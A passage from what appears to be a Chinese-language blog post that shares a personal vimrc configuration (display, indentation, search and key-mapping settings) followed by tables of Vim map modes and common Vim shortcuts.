输出到终端时采用的编码类型</span></span><br><span class="line"><span class="keyword">set</span> encoding=utf-<span class="number">8</span>			<span class="comment">&quot; 缓存的文本、寄存器、Vim 脚本文件等</span></span><br><span class="line"><span class="keyword">set</span> guifont=YaHei\ Consolas\ Hybrid\ <span class="number">11.5</span>	<span class="comment">&quot; 设置显示字体为YaHei Consolas Hybrid</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">number</span>			<span class="comment">&quot; 显示行号	缩写： nu</span></span><br><span class="line"><span class="keyword">set</span> relativenumber	<span class="comment">&quot; 从当前行向前向后算行数</span></span><br><span class="line"><span class="keyword">set</span> cursorline		<span class="comment">&quot; 突出显示当前行	缩写： cul</span></span><br><span class="line"><span class="string">&quot;set cursorcolumn	&quot;</span> 突出显示当前列	缩写： cuc</span><br><span class="line"><span class="keyword">set</span> showmatch		<span class="comment">&quot; 显示括号匹配</span></span><br><span class="line"><span class="keyword">set</span> showcmd			<span class="comment">&quot; 显示指令</span></span><br><span class="line"><span class="keyword">set</span> laststatus=<span class="number">2</span>	<span class="comment">&quot; 显示状态栏</span></span><br><span class="line"><span class="keyword">set</span> ruler			<span class="comment">&quot; 显示光标当前位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> wrap			<span class="comment">&quot; 自动换行</span></span><br><span class="line"><span class="keyword">set</span> tw=<span class="number">0</span>			<span class="comment">&quot; 防止自动分割行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> expandtab		<span class="comment">&quot; 将制表符扩展为空格</span></span><br><span class="line"><span class="keyword">set</span> softtabstop=<span class="number">4</span>	<span class="comment">&quot; 把连续数量的空格视为一个制表符</span></span><br><span class="line"><span class="keyword">set</span> tabstop=<span class="number">4</span>		<span class="comment">&quot; 制表符长度为4空格	缩写：ts</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">shiftwidth</span>=<span class="number">4</span>	<span class="comment">&quot; 自动缩进长度为4空格</span></span><br><span class="line"><span class="keyword">set</span> autoindent		<span class="comment">&quot; 自动缩进 缩写:ai</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">cindent</span>			<span class="comment">&quot; c格式自动缩进</span></span><br><span class="line"><span class="keyword">set</span> smartindent		<span class="comment">&quot; 开启智能对其</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 基于缩进或语法进行代码折叠 indent（基于缩进）、syntax(基于语法) </span></span><br><span class="line"><span class="comment">&quot; set foldmethod=indent</span></span><br><span class="line"><span class="keyword">set</span> foldmethod=<span class="keyword">syntax</span></span><br><span class="line"><span class="comment">&quot; 启动 vim 时关闭折叠代码</span></span><br><span class="line"><span class="keyword">set</span> nofoldenable</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> wildmenu		<span class="comment">&quot; 命令补全</span></span><br><span class="line"><span class="keyword">set</span> autochdir       <span class="comment">&quot; 在当前目录下执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> hlsearch		<span class="comment">&quot; 高亮显示搜索</span></span><br><span class="line"><span class="keyword">set</span> incsearch		<span class="string">&quot; 动态高亮搜索&quot;</span></span><br><span class="line"><span class="keyword">set</span> ignorecase		<span class="comment">&quot; 不区分大小写搜索</span></span><br><span class="line"><span class="keyword">set</span> smartcase		<span class="comment">&quot; 智能大小写搜索</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> mouse=<span class="keyword">a</span>			<span class="comment">&quot; 使用鼠标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> backspace=<span class="built_in">indent</span>,eol,start	<span class="comment">&quot; 能退格到行尾</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===END===</span></span><br><span class="line"><span class="comment">&quot;===set===</span></span><br><span class="line"><span class="comment">&quot;=========</span></span><br></pre></td></tr></table></figure>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;=============</span></span><br><span class="line"><span class="comment">&quot;===键盘映射===</span></span><br><span class="line"><span class="comment">&quot;====START====</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; map		在普通、可视、运算符模式下生效</span></span><br><span class="line"><span class="comment">&quot; map!		在插入、命令模式下生效</span></span><br><span class="line"><span class="comment">&quot; 键映射map，有五种前缀，对应着vim中的五种模式：</span></span><br><span class="line"><span class="comment">&quot; nore前缀：	非递归</span></span><br><span class="line"><span class="comment">&quot; n前缀：		在普通模式下生效</span></span><br><span class="line"><span class="comment">&quot; v前缀：		在可视模式下生效</span></span><br><span class="line"><span class="comment">&quot; o前缀：		在运算符模式下生效</span></span><br><span class="line"><span class="comment">&quot; i前缀：		在插入模式下生效 </span></span><br><span class="line"><span class="comment">&quot; c前缀：		在命令模式下生效</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===一些键表===</span></span><br><span class="line"><span class="comment">&quot; 因为某些原因，ALT几乎无法映射，同时CTRL键被linux系统频繁使用，F1到F12功能键某些也被vim占用，这些都不适合用来映射，以免造成快捷键冲突，在定义快捷键时为了避免一些冲突可用&lt;LEADER&gt;前缀键配合使用</span></span><br><span class="line"><span class="comment">&quot; &lt;k0&gt;-&lt;k9&gt;		小键盘数字0到9</span></span><br><span class="line"><span class="comment">&quot; &lt;S-x&gt;			大写S配合x，意味着shift+x组合键</span></span><br><span class="line"><span class="comment">&quot; &lt;C-x&gt;			大写C配合x，意味着ctrl+x组合键</span></span><br><span class="line"><span class="comment">&quot; &lt;A-x&gt;			大写A配合x，意味着alt+x组合键</span></span><br><span class="line"><span class="comment">&quot; &lt;ESC&gt;			ESC键</span></span><br><span class="line"><span class="comment">&quot; &lt;BS&gt;			backspace退格键</span></span><br><span class="line"><span class="comment">&quot; &lt;CR&gt;			ENTER回车键</span></span><br><span class="line"><span class="comment">&quot; &lt;Space&gt;		空格键</span></span><br><span class="line"><span class="comment">&quot; &lt;Shift&gt;		shift键</span></span><br><span class="line"><span class="comment">&quot; &lt;Ctrl&gt;		ctrl键</span></span><br><span class="line"><span class="comment">&quot; &lt;Alt&gt;			alt键</span></span><br><span class="line"><span class="comment">&quot; &lt;F1&gt;-&lt;F12&gt;	F1到F12功能键</span></span><br><span class="line"><span class="comment">&quot; &lt;LEADER&gt;		vim前缀键，类似于Windows键/command (⌘) 键</span></span><br><span class="line"><span class="comment">&quot; &lt;silent&gt;		命令不显示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; map 递归映射  a映射到c</span></span><br><span class="line"><span class="comment">&quot; map a b</span></span><br><span class="line"><span class="comment">&quot; map b c</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; nmap 普通模式下的递归映射&quot;</span></span><br><span class="line"><span class="comment">&quot; unmap 取消 map 的映射</span></span><br><span class="line"><span class="comment">&quot; mapclear 取消所有 map 的映射</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; noremap 不递归映射  a映射为b b映射为c 两个映射互不影响</span></span><br><span class="line"><span class="comment">&quot; noremap a b</span></span><br><span class="line"><span class="comment">&quot; noremap b c</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;noremap a b	&quot;</span> 将 <span class="keyword">a</span> 映射为 <span class="keyword">b</span></span><br><span class="line"><span class="string">&quot;noremap A 5b	&quot;</span> 将 A 映射为 <span class="number">5</span><span class="keyword">b</span></span><br><span class="line"><span class="string">&quot;noremap = nzz	&quot;</span> 将 n 映射 =zz 	<span class="comment">&quot; 用 zz 将该行变成中心点</span></span><br><span class="line"><span class="string">&quot;noremap - Nzz	&quot;</span> 将 <span class="keyword">N</span> 映射 -zz</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;--------------------------------------------------------------------------&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">noremap</span> <span class="symbol">&lt;LEADER&gt;</span><span class="symbol">&lt;CR&gt;</span> :<span class="keyword">nohlsearch</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 将 &lt;LEADER&gt;&lt;CR&gt; 映射为 :nohlsearch&lt;CR&gt; 用于快捷取消搜索高亮</span></span><br><span class="line"><span class="keyword">noremap</span> J <span class="number">5</span><span class="keyword">j</span></span><br><span class="line"><span class="keyword">noremap</span> K <span class="number">5</span><span class="keyword">k</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 复制到系统剪切板</span></span><br><span class="line"><span class="keyword">vnoremap</span> Y :<span class="keyword">w</span> !xclip -i -sel <span class="keyword">c</span> <span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 需要安装xclip  #sudo pacman -S xclip</span></span><br><span class="line"><span class="string">&quot;vnoremap Y &quot;</span>+<span class="keyword">y</span>		<span class="comment">&quot; 需要安装gvim   #sudo pacman -S gvim</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> MR :<span class="keyword">e</span> $MYVIMRC<span class="symbol">&lt;CR&gt;</span>			<span class="comment">&quot; 打开vimrc</span></span><br><span class="line"><span class="keyword">map</span> s <span class="symbol">&lt;nop&gt;</span></span><br><span class="line"><span class="keyword">map</span> S :<span class="keyword">w</span><span class="symbol">&lt;CR&gt;</span>	<span class="string">&quot; 将 S 的指令映射为 :w&lt;CR&gt; 	 &quot;</span> <span class="symbol">&lt;CR&gt;</span> 代表回车</span><br><span class="line"><span class="keyword">map</span> Q :q<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 将 Q 的指令映射为 :q&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;silent&gt;</span> <span class="symbol">&lt;C-a&gt;</span> ggvG 	<span class="comment">&quot; Ctrl-A 选中所有内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> sk :<span class="keyword">set</span> splitbelow<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">split</span><span class="symbol">&lt;CR&gt;</span>		<span class="string">&quot; 下分屏&quot;</span>:<span class="keyword">e</span> /文件路径 打开文件</span><br><span class="line"><span class="keyword">map</span> sj :<span class="keyword">set</span> nosplitbelow<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">split</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 上分屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">sl</span> :<span class="keyword">set</span> nosplitright<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">vsplit</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 右分屏 </span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">sh</span> :<span class="keyword">set</span> splitright<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">vsplit</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 左分屏	</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> sz <span class="symbol">&lt;C-w&gt;</span>t<span class="symbol">&lt;C-w&gt;</span>H 	<span class="comment">&quot; 竖向分屏换左右分屏</span></span><br><span class="line"><span class="keyword">map</span> ss <span class="symbol">&lt;C-w&gt;</span>t<span class="symbol">&lt;C-w&gt;</span>K		<span class="comment">&quot; 左右分屏换竖向分屏</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">k</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">k</span>	<span class="comment">&quot; 光标到上屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">j</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">j</span>	<span class="comment">&quot; 光标到下屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>h <span class="symbol">&lt;C-w&gt;</span>h	<span class="comment">&quot; 光标到左屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">l</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">l</span>	<span class="comment">&quot; 光标到右屏</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;up&gt;</span> :<span class="keyword">res</span> +<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>				<span class="comment">&quot; 分屏线上移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;down&gt;</span> :<span class="keyword">res</span> -<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>				<span class="comment">&quot; 分屏线下移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;left&gt;</span> :<span class="keyword">vertical</span> <span class="keyword">resize</span>+<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 分屏线左移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;right&gt;</span> :<span class="keyword">vertical</span> <span class="keyword">resize</span>-<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 分屏线右移</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">tn</span> :<span class="keyword">tabe</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 打开新选项卡</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">th</span> :-<span class="keyword">tabnext</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 到左边的选项卡</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">tl</span> :+<span class="keyword">tabnext</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 到右边的选项卡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 符号自动补全</span></span><br><span class="line">:<span class="keyword">inoremap</span> ( ()<span class="symbol">&lt;ESC&gt;</span>i</span><br><span class="line">:<span class="keyword">inoremap</span> ) <span class="symbol">&lt;c-r&gt;</span>=ClosePair(<span class="string">&#x27;)&#x27;</span>)<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="comment">&quot;:inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span></span><br><span class="line"><span class="comment">&quot;:inoremap &#125; &lt;c-r&gt;=ClosePair(&#x27;&#125;&#x27;)&lt;CR&gt;</span></span><br><span class="line">:<span class="keyword">inoremap</span> [ []<span class="symbol">&lt;ESC&gt;</span>i</span><br><span class="line">:<span class="keyword">inoremap</span> ] <span class="symbol">&lt;c-r&gt;</span>=ClosePair(<span class="string">&#x27;]&#x27;</span>)<span class="symbol">&lt;CR&gt;</span></span><br><span class="line">:<span class="keyword">inoremap</span> <span class="string">&quot; &quot;</span><span class="comment">&quot;&lt;ESC&gt;i</span></span><br><span class="line">:<span class="keyword">inoremap</span> <span class="string">&#x27; &#x27;</span><span class="string">&#x27;&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">function! ClosePair(char)</span></span><br><span class="line"><span class="string">	if getline(&#x27;</span>.<span class="string">&#x27;)[col(&#x27;</span>.<span class="string">&#x27;) - 1] == a:char</span></span><br><span class="line"><span class="string">		return &quot;\&lt;Right&gt;&quot;</span></span><br><span class="line"><span class="string">	else</span></span><br><span class="line"><span class="string">		return a:char</span></span><br><span class="line"><span class="string">	endif</span></span><br><span class="line"><span class="string">endfunction</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;=====END=====</span></span><br><span class="line"><span class="string">&quot;===键盘映射===</span></span><br><span class="line"><span class="string">&quot;=============</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Command 命令</th>
<th style="text-align:center">Normal   常规模式</th>
<th style="text-align:center">Visual 可视化模式</th>
<th style="text-align:center">Operator Pending 运算符模式</th>
<th style="text-align:center">Insert Only 插入模式</th>
<th style="text-align:center">Command Line 命令行模式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>:map</code></td>
<td style="text-align:center">y</td>
<td style="text-align:center">y</td>
<td style="text-align:center">y</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>:map!</code></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">y</td>
<td style="text-align:center">y</td>
</tr>
<tr>
<td style="text-align:center"><code>:nmap</code></td>
<td style="text-align:center">y</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>:vmap</code></td>
<td style="text-align:center"></td>
<td style="text-align:center">y</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>:omap</code></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">y</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>:imap</code></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">y</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>:cmap</code></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">y</td>
</tr>
</tbody>
</table>
</div>
<h2 id="vim快捷键速查"><a href="#vim快捷键速查" class="headerlink" title="vim快捷键速查"></a>vim快捷键速查</h2><h4 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">从当前模式转换到“普通模式”。所有的键对应到命令。</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">“插入模式”用于插入文字。回归按键的本职工作。</td>
</tr>
<tr>
<td style="text-align:left"><code>:</code></td>
<td style="text-align:left">“命令行模式” Vim 希望你输入类似于保存该文档命令的地方。</td>
</tr>
</tbody>
</table>
</div>
<h4 id="方向键"><a href="#方向键" class="headerlink" title="方向键"></a>方向键</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>h</code></td>
<td style="text-align:left">光标向左移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>j</code> 或 <code>Ctrl + J</code></td>
<td style="text-align:left">光标向下移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>k</code> 或 <code>Ctrl + P</code></td>
<td style="text-align:left">光标向上移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>l</code></td>
<td style="text-align:left">光标向右移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>0</code></td>
<td style="text-align:left">（数字 0）移动光标至本行开头</td>
</tr>
<tr>
<td style="text-align:left"><code>$</code></td>
<td style="text-align:left">移动光标至本行末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">移动光标至本行第一个非空字符处</td>
</tr>
<tr>
<td style="text-align:left"><code>w</code></td>
<td style="text-align:left">向前移动一个词 （上一个字母和数字组成的词之后）</td>
</tr>
<tr>
<td style="text-align:left"><code>W</code></td>
<td style="text-align:left">向前移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5w</code></td>
<td style="text-align:left">向前移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>b</code></td>
<td style="text-align:left">向后移动一个词 （下一个字母和数字组成的词之前）</td>
</tr>
<tr>
<td style="text-align:left"><code>B</code></td>
<td style="text-align:left">向后移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5b</code></td>
<td style="text-align:left">向后移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>G</code></td>
<td style="text-align:left">移动至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>gg</code></td>
<td style="text-align:left">移动至文件开头</td>
</tr>
</tbody>
</table>
</div>
<h4 id="文档浏览"><a href="#文档浏览" class="headerlink" title="文档浏览"></a>文档浏览</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>(</code></td>
<td style="text-align:left">跳转到上一句</td>
</tr>
<tr>
<td style="text-align:left"><code>)</code></td>
<td style="text-align:left">跳转到下一句</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;</code></td>
<td style="text-align:left">跳转到上一段</td>
</tr>
<tr>
<td style="text-align:left"><code>&#125;</code></td>
<td style="text-align:left">跳转到下一段</td>
</tr>
<tr>
<td style="text-align:left"><code>[[</code></td>
<td style="text-align:left">跳转到上一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>]]</code></td>
<td style="text-align:left">跳转到下一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>[]</code></td>
<td style="text-align:left">跳转到上一部分的末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>][</code></td>
<td style="text-align:left">跳转到上一部分的开头</td>
</tr>
</tbody>
</table>
</div>
<h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>a</code></td>
<td style="text-align:left">在光标后插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>A</code></td>
<td style="text-align:left">在行末插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">在光标前插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>o</code></td>
<td style="text-align:left">（小写字母 o）在光标下方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>O</code></td>
<td style="text-align:left">（大写字母 O）在光标上方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>:r [filename]</code></td>
<td style="text-align:left">在光标下方插入文件 [filename] 的内容</td>
</tr>
<tr>
<td style="text-align:left"><code>:r ![command]</code></td>
<td style="text-align:left">执行命令 [command] ，并将输出插入至光标下方</td>
</tr>
</tbody>
</table>
</div>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>x</code></td>
<td style="text-align:left">删除光标处字符</td>
</tr>
<tr>
<td style="text-align:left"><code>dw</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>d0</code></td>
<td style="text-align:left">删至行首</td>
</tr>
<tr>
<td style="text-align:left"><code>d$</code></td>
<td style="text-align:left">删至行末</td>
</tr>
<tr>
<td style="text-align:left"><code>d)</code></td>
<td style="text-align:left">删至句末</td>
</tr>
<tr>
<td style="text-align:left"><code>dgg</code></td>
<td style="text-align:left">删至文件开头</td>
</tr>
<tr>
<td style="text-align:left"><code>dG</code></td>
<td style="text-align:left">删至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>dd</code></td>
<td style="text-align:left">删除该行</td>
</tr>
<tr>
<td style="text-align:left"><code>3dd</code></td>
<td style="text-align:left">删除三行</td>
</tr>
</tbody>
</table>
</div>
<h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>r&#123;text&#125;</code></td>
<td style="text-align:left">将光标处的字符替换成 {text}</td>
</tr>
<tr>
<td style="text-align:left"><code>R</code></td>
<td style="text-align:left">进入覆写模式，输入的字符将替换原有的字符</td>
</tr>
</tbody>
</table>
</div>
<h4 id="撤销重做"><a href="#撤销重做" class="headerlink" title="撤销重做"></a>撤销重做</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>u</code></td>
<td style="text-align:left">撤销最后的操作</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+r</code></td>
<td style="text-align:left">重做最后撤销的操作</td>
</tr>
</tbody>
</table>
</div>
<h4 id="搜索、替换"><a href="#搜索、替换" class="headerlink" title="搜索、替换"></a>搜索、替换</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/search_text</code></td>
<td style="text-align:left">检索文档，在文档后面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>?search_text</code></td>
<td style="text-align:left">检索文档，在文档前面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>n</code></td>
<td style="text-align:left">移动到后一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>N</code></td>
<td style="text-align:left">移动到前一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement</code></td>
<td style="text-align:left">检索第一个 “original” 字符串并将其替换成 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/g</code></td>
<td style="text-align:left">检索并将所有的 “original” 替换为 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/gc</code></td>
<td style="text-align:left">检索出所有的 “original” 字符串，但在替换成 “replacement” 前，先询问是否替换</td>
</tr>
</tbody>
</table>
</div>
<h4 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>m &#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">在当前光标位置设置书签，书签名可用一个大小写字母（{a-zA-Z}）</td>
</tr>
<tr>
<td style="text-align:left"><code>:marks</code></td>
<td style="text-align:left">列出所有书签</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">跳转到书签 {a-zA-Z}</td>
</tr>
</tbody>
</table>
</div>
<h4 id="可视模式"><a href="#可视模式" class="headerlink" title="可视模式"></a>可视模式</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>v</code></td>
<td style="text-align:left">进入逐字可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>V</code></td>
<td style="text-align:left">进入逐行可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">退出可视模式</td>
</tr>
</tbody>
</table>
</div>
<h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>~</code></td>
<td style="text-align:left">切换大小写</td>
</tr>
<tr>
<td style="text-align:left"><code>d</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>c</code></td>
<td style="text-align:left">变更</td>
</tr>
<tr>
<td style="text-align:left"><code>y</code></td>
<td style="text-align:left">复制</td>
</tr>
<tr>
<td style="text-align:left"><code>&gt;</code></td>
<td style="text-align:left">右移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;</code></td>
<td style="text-align:left">左移</td>
</tr>
<tr>
<td style="text-align:left"><code>!</code></td>
<td style="text-align:left">通过外部命令进行过滤</td>
</tr>
</tbody>
</table>
</div>
<h4 id="保存、退出"><a href="#保存、退出" class="headerlink" title="保存、退出"></a>保存、退出</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>:q</code></td>
<td style="text-align:left">退出 Vim，如果文件已被修改，将退出失败</td>
</tr>
<tr>
<td style="text-align:left"><code>:w</code></td>
<td style="text-align:left">保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:w new_name</code></td>
<td style="text-align:left">用 new_name 作为文件名保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:wq</code></td>
<td style="text-align:left">保存文件并退出 Vim</td>
</tr>
<tr>
<td style="text-align:left"><code>:q!</code></td>
<td style="text-align:left">退出 Vim，不保存文件改动</td>
</tr>
<tr>
<td style="text-align:left"><code>ZZ</code></td>
<td style="text-align:left">退出 Vim，如果文件被改动过，保存改动内容</td>
</tr>
<tr>
<td style="text-align:left"><code>ZQ</code></td>
<td style="text-align:left">与 :q! 相同，退出 Vim，不保存文件改动</td>
</tr>
</tbody>
</table>
</div>
<p><a href="https://linux.cn/article-8144-1.html">参考</a></p>
